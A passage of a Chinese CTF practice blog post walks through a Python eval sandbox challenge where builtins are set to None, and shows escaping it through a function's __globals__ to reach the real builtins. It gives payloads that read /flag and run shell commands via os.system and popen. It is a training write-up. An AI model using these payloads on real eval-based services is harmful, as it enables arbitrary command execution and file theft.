<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">ev4l</span>(<span class="hljs-params">*args</span>):<br>    <span class="hljs-built_in">print</span>(secret)<br>inp = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;&gt; &quot;</span>)<br>f = <span class="hljs-keyword">lambda</span>: <span class="hljs-literal">None</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">eval</span>(inp, &#123;<span class="hljs-string">&quot;__builtins__&quot;</span>: <span class="hljs-literal">None</span>, <span class="hljs-string">&#x27;f&#x27;</span>: f, <span class="hljs-string">&#x27;eval&#x27;</span>: ev4l&#125;))<br></code></pre></td></tr></table></figure>
<p>代码分析：globals 和 builtins</p>
<p><code>globals</code> 是我们当前的全局空间，如果你声明一个全局变量，它将会存在于当前的 <code>globals</code> 中，我们可以看一下 <code>globals</code> 中有哪些内容：</p>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1748510507406.png" srcset="/img/loading.gif" lazyload alt="1748510507406"></p>
<p>当我们访问函数时，如果 <code>globals</code> 中有，那就执行 <code>globals</code> 中的（可能是你自己定义的，因此存在于 <code>globals</code> 空间中），否则，执行 <code>builtins</code> 中的。</p>
<p><code>builtins</code> 中有哪些内容：</p>
<p>一些库函数，例如open,print,eval</p>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1748510894476.png" srcset="/img/loading.gif" lazyload alt="1748510894476"></p>
<p>关键代码分析：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(<span class="hljs-built_in">eval</span>(inp, &#123;<span class="hljs-string">&quot;__builtins__&quot;</span>: <span class="hljs-literal">None</span>, <span class="hljs-string">&#x27;f&#x27;</span>: f, <span class="hljs-string">&#x27;eval&#x27;</span>: ev4l&#125;))<br></code></pre></td></tr></table></figure>
<p>第二个参数 <code>&#123;&quot;__builtins__&quot;: None, 'f': f, 'eval': ev4l&#125;</code> 是 <code>eval</code> 的执行上下文，只暴露：</p>
<ul>
<li><code>'f'</code>: 一个空函数（无用）</li>
<li><code>'eval'</code>: 实际上是 <code>ev4l</code> 函数的别名</li>
<li>不包含 <code>__builtins__</code>，因此不能直接使用 Python 内置函数（如 <code>print</code>, <code>open</code>, <code>len</code> 等）</li>
</ul>
<ol start="2">
<li>代码结构：</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># In source code</span><br><span class="hljs-built_in">globals</span>()               &lt;- f.__globals__<br>  ├─ __builtins__       &lt;- f.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>]<br>  │  ├─ <span class="hljs-built_in">open</span>            &lt;- f.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>].<span class="hljs-built_in">open</span><br>  │  ├─ <span class="hljs-built_in">eval</span>            &lt;- f.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>].<span class="hljs-built_in">eval</span><br>  │  └─ ...<br>  ├─ f                  &lt;- f.__globals__[<span class="hljs-string">&#x27;f&#x27;</span>]<br>  └─ <span class="hljs-built_in">print</span>(<span class="hljs-built_in">eval</span>(inp, &#123;<span class="hljs-string">&quot;__builtins__&quot;</span>: <span class="hljs-literal">None</span>, <span class="hljs-string">&#x27;f&#x27;</span>: f, <span class="hljs-string">&#x27;eval&#x27;</span>: ev4l&#125;))<br>     <span class="hljs-built_in">globals</span>()      <span class="hljs-comment">#定义了自己的上下文（沙箱）</span><br>       ├─ __builtins__   &lt;- <span class="hljs-literal">None</span><br>       ├─ f<br>       └─ ...<br></code></pre></td></tr></table></figure>
<ol start="3">
<li>Python 中「一切皆对象」，可以利用函数对象f的 <code>__globals__</code> 属性来逃逸，从而访问全局的<code>builtins</code>，而不是沙箱中的<code>bultins</code>。</li>
</ol>
<p>利用全局的<code>builtins</code>就可以使用函数来执行命令</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#比如构造inp如下：</span><br><span class="hljs-comment">#文件读取</span><br>f.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>].<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>).read()<br><span class="hljs-comment">#代码执行(这里有注意事项)</span><br>f.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>] .<span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;open(&quot;/flag&quot;).read()&#x27;</span>, &#123; <span class="hljs-string">&quot;__builtins__&quot;</span>: f.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>] &#125;)<br><span class="hljs-comment">#命令执行</span><br>f.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>].<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&#x27;ls&#x27;</span>)<br>f.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>].<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>).popen(<span class="hljs-string">&#x27;cat /flag&#x27;</span>).read()<br></code></pre></td></tr></table></figure>
<ol start="4">
<li>注意事项：</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#但这里需要注意，如果inp含有eval,又被嵌入到下面的eval语句中:</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">eval</span>(inp, &#123;<span class="hljs-string">&quot;__builtins__&quot;</span>: <span class="hljs-literal">None</span>, <span class="hljs-string">&#x27;f&#x27;</span>: f, <span class="hljs-string">&#x27;eval&#x27;</span>: ev4l&#125;))<br><br><span class="hljs-comment">#eval()函数结构如下：</span><br><span class="hljs-built_in">eval</span>(expression[,<span class="hljs-built_in">globals</span>,<span class="hljs-built_in">locals</span>])<br>如果我们在内部的<span class="hljs-built_in">eval</span>中没有指定<span class="hljs-keyword">global</span>，内部的<span class="hljs-built_in">eval</span>的<span class="hljs-keyword">global</span>会自动继承外部的<span class="hljs-built_in">eval</span>，继承了builtin为<span class="hljs-literal">None</span>的情况，也没有<span class="hljs-built_in">print</span>函数，无法执行内部的<span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;print(1)&#x27;</span>)<br><br><span class="hljs-comment">#正确的方法，内部也指定global,inp如下:</span><br>f.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>].<span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;system(&#x27;</span>ls<span class="hljs-string">&#x27;)&#x27;</span>, &#123;<span class="hljs-string">&quot;__builtins__&quot;</span>:f.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>]&#125;)<br></code></pre></td></tr></table></figure>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/CTF/" class="print-no-link">#CTF</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>刷题记录</div>
      <div>https://rain00star.github.io/2025/05/28/BUUCTF刷题记录/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>Author</div>
          <div>rainstar</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>Posted on</div>
          <div>May 28, 2025</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>Licensed under</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
                    <i class="iconfont icon-cc-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2025/05/13/java%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="java学习笔记">
                        <span class="hidden-mobile">java学习笔记</span>
                        <span class="visible-mobile">Next</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>Table of Contents</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  


  
  









    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <div> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> 
    </div>
  
  
    <div class="statistics">
  
  

  
    
      <span id="leancloud-site-pv-container" style="display: none">
        
        <span id="leancloud-site-pv"></span>
         次
      </span>
    
    
      <span id="leancloud-site-uv-container" style="display: none">
        
        <span id="leancloud-site-uv"></span>
         人
      </span>
    
    

  

</div>

  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  
      <script>
        if (!window.MathJax) {
          window.MathJax = {
            tex    : {
              inlineMath: { '[+]': [['$', '$']] }
            },
            loader : {
              load: ['ui/lazy']
            },
            options: {
              renderActions: {
                insertedScript: [200, () => {
                  document.querySelectorAll('mjx-container').forEach(node => {
                    let target = node.parentNode;
                    if (target.nodeName.toLowerCase() === 'li') {
                      target.parentNode.classList.add('has-jax');
                    }
                  });
                }, '', false]
              }
            }
          };
        } else {
          MathJax.startup.document.state(0);
          MathJax.texReset();
          MathJax.typeset();
          MathJax.typesetPromise();
        }

        Fluid.events.registerRefreshCallback(function() {
          if ('MathJax' in window && MathJax.startup.document && typeof MathJax.startup.document.state === 'function') {
            MathJax.startup.document.state(0);
            MathJax.texReset();
            MathJax.typeset();
            MathJax.typesetPromise();
          }
        });
      </script>
    

  <script  src="https://lib.baomitu.com/mathjax/3.2.2/es5/tex-mml-chtml.js" ></script>

  <script defer src="/js/leancloud.js" ></script>

  <script  src="/js/local-search.js" ></script>




  
<script src="/js/snowflake.js"></script>



<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
  </noscript>
</body>
</html>
